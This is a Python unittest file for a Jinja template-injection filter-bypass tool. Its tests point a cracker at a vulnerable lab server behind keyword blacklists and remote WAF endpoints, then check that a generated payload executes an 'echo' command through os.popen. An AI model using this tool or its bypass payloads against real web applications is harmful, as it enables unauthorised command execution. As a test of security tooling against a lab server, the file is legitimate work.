# pylint: skip-file
# flake8: noqa

import sys

sys.path.append("..")
from fenjing.form import get_form
from fenjing.requester import Requester
import unittest
import fenjing
from typing import Union
from fenjing.cracker import Cracker
from fenjing.submitter import FormSubmitter, Submitter, HTTPResponse
from fenjing import const
import logging
import os

VULUNSERVER_ADDR = os.environ["VULUNSERVER_ADDR"]


class WrappedSubmitter(Submitter):
    def __init__(self, subm, blacklist):
        super().__init__()
        self.subm = subm
        self.blacklist = blacklist

    def submit_raw(self, raw_payload):
        if any(w in raw_payload for w in self.blacklist):
            return HTTPResponse(status_code=200, text="Nope")
        return self.subm.submit(raw_payload)


class CrackerTestBase(unittest.TestCase):
    def setup_local_waf(self, blacklist):
        self.local_blacklist = blacklist
        self.subm = WrappedSubmitter(
            FormSubmitter(
                url=VULUNSERVER_ADDR,
                form=get_form(action="/", inputs=["name"], method="GET"),
                target_field="name",
                requester=Requester(interval=0.01),
            ),
            self.local_blacklist,
        )

    def setup_remote_waf(self, remote_uri):
        self.local_blacklist = None
        self.subm = FormSubmitter(
            url=VULUNSERVER_ADDR,
            form=get_form(action=remote_uri, inputs=["name"], method="GET"),
            target_field="name",
            requester=Requester(interval=0.01),
        )

    def setUp(self):
        super().setUp()
        self.setup_local_waf(["."])

    def test_waf(self):
        cracker = Cracker(self.subm)
        full_payload_gen = cracker.crack()
        assert full_payload_gen is not None
        payload, will_print = full_payload_gen.generate(
            const.OS_POPEN_READ,
            "echo 'cracked! @m wr!tI1111ng s()th' " + self.__class__.__name__,
        )
        assert payload is not None  # 因为type hint无法认出.assertIsNotNone
        self.assertTrue(will_print)
        if self.local_blacklist:
            for w in self.local_blacklist:
                self.assertNotIn(w, payload)
        resp = self.subm.submit(payload)
        assert resp is not None
        self.assertIn("cracked! @m wr!tI1111ng s()th", resp.text)

class CrackerTestEasy(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.setup_local_waf(
            [
                '"',
                "'",
                "_",
                ".",
                "+",
                "~",
                "{{",
            ]
        )



class CrackerTestHard(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.setup_local_waf(
            [
                "config",
                "self",
                "g",
                "os",
                "class",
                "length",
                "mro",
                "base",
                "lipsum",
                "os",
                "import",
                "x",
                "url",
                "globals",
                "cycler",
                "[",
                '"',
                "'",
                "_",
                ".",
                "+",
                "~",
                "{{",
            ]
        )


class CrackerTestStaticWAF(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.setup_remote_waf("/static_waf")


class CrackerTestDynamicWAF(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.blacklist = None
        self.setup_remote_waf("/dynamic_waf")


class CrackerTestWeirdWAF(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.blacklist = None
        self.setup_remote_waf("/weird_waf")

class CrackerTestReversedWAF(CrackerTestBase):
    def setUp(self):
        super().setUp()
        self.blacklist = None
        self.setup_remote_waf("/reversed_waf")
        self.subm.add_tamperer(lambda x: x[::-1])
